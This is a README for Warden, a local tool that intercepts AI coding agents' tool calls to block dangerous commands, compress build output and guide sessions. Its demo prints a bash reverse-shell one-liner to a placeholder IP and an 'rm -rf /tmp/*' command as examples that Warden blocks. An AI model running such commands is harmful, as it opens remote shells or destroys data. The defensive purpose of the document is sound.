<p align="center">
  <img src="https://raw.githubusercontent.com/ekud12/warden-releases/main/assets/logo.png" alt="Warden" width="100" />
</p>

<h1 align="center">Warden</h1>

<p align="center">
  <strong>Runtime governance for AI coding agents.</strong><br/>
  Deterministic safety. Bounded session guidance. Aggressive output compression.<br/>
  One install. Zero config.
</p>

<p align="center">
  <a href="https://github.com/ekud12/warden-releases/releases"><img src="https://img.shields.io/github/v/release/ekud12/warden-releases?style=flat-square&color=blue&label=version" alt="Version" /></a>
  <a href="https://www.rust-lang.org/"><img src="https://img.shields.io/badge/rust-orange?style=flat-square&logo=rust" alt="Rust" /></a>
  <img src="https://img.shields.io/badge/win%20%7C%20mac%20%7C%20linux-lightgrey?style=flat-square" alt="Platform" />
  <img src="https://img.shields.io/badge/local--first-100%25-brightgreen?style=flat-square" alt="Local" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Claude_Code-supported-8A2BE2?style=flat-square" alt="Claude Code" />
  <img src="https://img.shields.io/badge/Gemini_CLI-supported-4285F4?style=flat-square" alt="Gemini CLI" />
  <img src="https://img.shields.io/badge/Codex_CLI-supported-10A37F?style=flat-square" alt="Codex CLI" />
</p>

<p align="center">
  <a href="https://bitmill.dev/docs">Docs</a> &bull;
  <a href="https://bitmill.dev">Homepage</a> &bull;
  <a href="https://github.com/ekud12/warden-releases/releases">Changelog</a> &bull;
  <a href="https://github.com/ekud12/warden-releases/issues">Issues</a>
</p>

---

## What is Warden?

Warden is a runtime governance layer for AI coding agents. It hooks into every tool call your agent makes — blocking dangerous actions, compressing noisy output, and guiding struggling sessions — before anything reaches your codebase.

Unlike prompt rules (CLAUDE.md, system prompts) that the model can ignore or lose during compaction, Warden operates **outside the model's context window** with deterministic enforcement. The agent cannot bypass it.

```
Agent:   rm -rf /tmp/*
Warden:  BLOCKED — rm -rf on broad paths. Remove specific files by name.

Agent:   bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
Warden:  BLOCKED — Reverse shell pattern detected.

Agent:   grep -r "TODO" src/
Warden:  Use rg (ripgrep) instead — faster, respects .gitignore.

cargo test output: 500 lines
Warden compressed: 8 lines — only failures + summary reach the context window.
```

---

## Install

```bash
npx @bitmilldev/warden init
```

Or via platform package managers:

```bash
# Windows
scoop bucket add warden https://github.com/ekud12/scoop-warden
scoop install warden

# macOS / Linux
brew install ekud12/warden/warden
```

Then connect to your agent:

```bash
warden install claude-code    # or: gemini-cli, codex-cli
```

That's it. Start a coding session — Warden activates automatically via hooks.

---

## What It Does

Warden makes five kinds of decisions on every tool call:

| Decision | What happens | Example |
|----------|-------------|---------|
| **Pass** | Command proceeds silently. | Normal work — the agent doesn't know Warden is there. |
| **Deny** | Command blocked with explanation. | `rm -rf /`, credential exposure, reverse shells. |
| **Teach** | Command runs + agent gets a hint. | "4 files edited since last build — run tests." |
| **Apply** | Command rewritten to safer form. | `grep` → `rg`, `find` → `fd`, `du` → `dust`. |
| **Require Structure** | Agent asked to rethink approach. | Session is looping on the same error. |

### Safety & Enforcement (deterministic)

Hundreds of compiled patterns block destructive commands, credential theft, hallucinated flags, reverse shells, and prompt injection — before they execute. Same input, same output, every time. Covers Windows, macOS, and Linux attack surfaces including platform-specific LOLBins and privilege escalation vectors.

### Output Compression (deterministic)

Build logs, test suites, install output — Warden strips the noise and keeps errors, warnings, and summaries. A 500-line `cargo test` output becomes 8 lines. Context waste drops dramatically. 19 built-in filters cover cargo, npm, pytest, jest, kubectl, terraform, docker, cloud CLIs, and more.

### Session Guidance (heuristic, bounded)

Warden monitors focus, detects loops, tracks verification debt, and injects corrections when sessions drift. Healthy sessions run silently. Struggling sessions get more guidance. All session intelligence is stored out-of-band, not in the model's context window.

### Cross-Session Learning

When a session ends, Warden extracts repair patterns, project conventions, and working-set rankings. The next session starts with a compact resume packet — so the agent doesn't lose hard-won context after compaction.

---

## How It Compares

| | Warden | Prompt rules | Guardrails AI | Multi-agent harness |
|--|--------|-------------|---------------|---------------------|
| **Enforcement** | Deterministic (compiled patterns) | Advisory (model may ignore) | Model-based (LLM call) | External orchestration |
| **Latency** | Sub-second (local binary) | 0ms (static text) | 100ms+ (API call) | N/A |
| **Local** | 100% local | Local | Cloud required | Varies |
| **Scope** | Tool calls + output | Conversation only | API input/output | Workflow coordination |
| **Session awareness** | Phase tracking, drift, loops | None | None | Sprint-level only |
| **Agents** | Claude + Gemini + Codex | Per-assistant | OpenAI only | Varies |

Warden and multi-agent harnesses are **complementary** — a harness coordinates agents from the outside, Warden governs each session from the inside. Use both.

---

## Configuration

Warden works with zero config. Customize when you want to:

```
Compiled defaults (hundreds of rules — immutable safety floor)
  → ~/.warden/rules.toml (global overrides)
    → ~/.warden/packs/*.toml (installed rule packs)
      → .warden/rules.toml (project-level)
```

### Rule Packs

Domain-specific rule bundles you can install:

```bash
warden pack list                 # See available packs
warden pack install database     # SQL safety, migration guards
warden pack install enterprise   # Compliance, secret scanning, audit trail
warden pack install infra-ops    # Terraform, kubectl, Docker safety
warden pack install frontend-dev # React, Vite, Webpack guards
```

### Example: project rules

```toml
# .warden/rules.toml
[auto_allow]
patterns = ["^terraform ", "^kubectl "]

[[command_filters]]
match = "terraform plan"
strategy = "keep_matching"
keep_patterns = ["Plan:", "to add", "Error:"]
max_lines = 30
```

---

## Privacy

Warden is **100% local during hook execution**. Every safety decision, every session signal, every output compression happens on your machine.

- No telemetry. No analytics. No phone-home.
- No cloud dependencies. All rules compiled into the binary.
- Your code never leaves your machine.

Only `warden update` and `warden install` make network calls (to download binaries from this repo).

---

## Commands

```bash
warden doctor          # Health check: binary, server, hooks, config
warden status          # Current session: turn, phase, focus, errors
warden describe --all  # List all active rules with IDs
warden explain <id>    # Why a rule exists and how to disable it
warden scorecard       # Session quality summary
warden sprint-reset    # Resume packet for multi-agent harness boundaries
warden pack list       # Available rule packs
warden mcp             # Start MCP server (7 tools for agent queries)
```

---

## Documentation

Full docs at **[bitmill.dev/docs](https://bitmill.dev/docs)**:

| Topic | Link |
|-------|------|
| What is Warden? | [Overview](https://bitmill.dev/docs/getting-started/overview) |
| Installation | [Install Guide](https://bitmill.dev/docs/getting-started/installation) |
| Runtime Policy | [5 Decision Types](https://bitmill.dev/docs/concepts/runtime-policy) |
| Rule Engine | [Compiled Patterns](https://bitmill.dev/docs/concepts/rule-engine) |
| Session Intelligence | [Health Tracking](https://bitmill.dev/docs/concepts/session-intelligence) |
| Output Compression | [Filter System](https://bitmill.dev/docs/concepts/output-compression) |
| Configuration | [Rules & Packs](https://bitmill.dev/docs/configuration/config-reference) |
| How It Compares | [Comparison](https://bitmill.dev/docs/getting-started/comparison) |
| Design Philosophy | [Principles](https://bitmill.dev/docs/concepts/design-philosophy) |
| CLI Commands | [Reference](https://bitmill.dev/docs/reference/commands) |
| Troubleshooting | [Common Issues](https://bitmill.dev/docs/getting-started/troubleshooting) |

---

## Issues & Feedback

This is the public releases repo. The source code is private.

- **Bug reports** → [Open an issue](https://github.com/ekud12/warden-releases/issues/new?template=bug_report.md)
- **Feature requests** → [Open an issue](https://github.com/ekud12/warden-releases/issues/new?template=feature_request.md)
- **Questions** → [Discussions](https://github.com/ekud12/warden-releases/discussions) (if enabled) or [open an issue](https://github.com/ekud12/warden-releases/issues)

---

<p align="center">
  Single Rust binary &bull; Windows, macOS, Linux &bull; Built by <a href="https://bitmill.dev">Bitmill</a>
</p>
